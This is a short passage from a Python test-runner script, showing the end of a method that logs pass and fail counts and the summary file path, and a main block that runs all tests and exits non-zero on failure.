        self.log(f"TEST RUN COMPLETED: {passed}/{total} PASSED ({failed} FAILED) in {total_time}s")
        self.log(f"Summary written to: {out_summary}")
        self.log("=" * 60)
        return summary


if __name__ == "__main__":
    runner = TestRunner(Path.cwd())
    summary = runner.run_all()
    if summary["failed"] > 0:
        sys.exit(1)
    sys.exit(0)
